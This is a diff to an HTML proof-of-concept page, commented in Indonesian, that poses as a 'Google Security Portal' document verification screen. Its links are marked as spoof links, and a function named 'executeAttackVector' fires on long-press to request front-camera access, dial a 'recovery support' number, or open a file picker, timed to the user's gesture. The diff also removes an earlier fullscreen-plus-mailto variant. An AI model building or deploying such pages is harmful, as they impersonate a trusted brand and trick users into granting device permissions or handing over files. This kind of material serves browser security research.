@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Security Verification PoC</title>
+    <title>Camera Permission & File Picker PoC</title>
     <style>
         :root {
             --primary-color: #1a73e8;
@@ -157,9 +157,11 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Hanya 1 Tombol Mailto -->
+    <!-- Container dengan Tombol Izin Kamera, Tel, & File Picker -->
     <div class="button-container">
-        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkCamera" data-intent="camera_verification">Open Window & Request Camera Access</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
     </div>
 
     <!-- Preview Box -->
@@ -173,44 +175,58 @@
     <script>
         let triggered = false;
 
-        // Fungsi bantu Fullscreen khusus untuk tombol Mailto
-        const requestImmersiveFullscreen = () => {
-            const docElement = document.documentElement;
-            if (docElement.requestFullscreen) {
-                docElement.requestFullscreen().catch(err => {
-                    console.debug("Fullscreen request denied or restricted:", err.message);
-                });
-            } else if (docElement.webkitRequestFullscreen) {
-                docElement.webkitRequestFullscreen();
-            }
-        };
-
-        const executeAttackVector = async (actionType, intent) => {
+        const executeAttackVector = (actionType, intent) => {
             if (triggered) return;
             triggered = true;
 
-            // Picu Fullscreen hanya ketika aksi mailto dijalankan
-            if (actionType === 'mailto') {
-                requestImmersiveFullscreen();
-            }
-
-            if (navigator.vibrate) {
-                navigator.vibrate(40);
-            }
-
+            // Timer optimized to match animation/interaction flow
             setTimeout(async () => {
                 try {
                     const previewBox = document.getElementById("previewBox");
                     const imagePreview = document.getElementById("imagePreview");
                     const fileInfo = document.getElementById("fileInfo");
 
-                    if (actionType === 'mailto') {
-                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
-                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
-                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
-                        fileInfo.innerText = `Triggered mailto protocol for: [${intent}]`;
+                    if (actionType === 'camera') {
+                        // Meminta izin akses kamera perangkat secara langsung
+                        const constraints = { video: { facingMode: 'user' } };
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        
+                        fileInfo.innerText = `Camera permission granted for intent: [${intent}]`;
                         imagePreview.src = "";
                         previewBox.style.display = "block";
+
+                        // Hentikan stream setelah izin didapat agar lampu indikator kamera mati kembali
+                        stream.getTracks().forEach(track => track.stop());
+                    } 
+                    else if (actionType === 'tel') {
+                        window.location.href = "tel:+18005550199";
+                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'filepicker') {
+                        // Menggunakan File System Access API
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false,
+                            types: [{
+                                description: 'Images & Documents',
+                                accept: { 
+                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                    'application/pdf': ['.pdf']
+                                }
+                            }]
+                        });
+
+                        const file = await fileHandle.getFile();
+                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
+
+                        if (file.type.startsWith('image/')) {
+                            imagePreview.src = URL.createObjectURL(file);
+                            previewBox.style.display = "block";
+                        } else {
+                            imagePreview.src = "";
+                            previewBox.style.display = "block";
+                        }
                     }
 
                 } catch (err) {
@@ -218,16 +234,34 @@
                 } finally {
                     setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 2000);
+            }, 2400);
         };
 
-        // Event Listener khusus untuk tombol Mailto tunggal
-        const linkMailto = document.getElementById("targetLinkMailto");
-        if (linkMailto) {
-            linkMailto.addEventListener("contextmenu", (e) => {
-                executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
+        // Event listener untuk Tombol Camera Permission
+        const linkCamera = document.getElementById("targetLinkCamera");
+        if (linkCamera) {
+            linkCamera.addEventListener("contextmenu", (e) => {
+                executeAttackVector('camera', linkCamera.getAttribute('data-intent'));
             });
-            linkMailto.addEventListener("touchstart", () => {}, { passive: true });
+            linkCamera.addEventListener("touchstart", () => {}, { passive: true });
+        }
+
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        if (linkTel) {
+            linkTel.addEventListener("contextmenu", (e) => {
+                executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+            });
+            linkTel.addEventListener("touchstart", () => {}, { passive: true });
+        }
+
+        // Event listener untuk Tombol File Picker
+        const linkFile = document.getElementById("targetLinkFile");
+        if (linkFile) {
+            linkFile.addEventListener("contextmenu", (e) => {
+                executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+            });
+            linkFile.addEventListener("touchstart", () => {}, { passive: true });
         }
     </script>
 
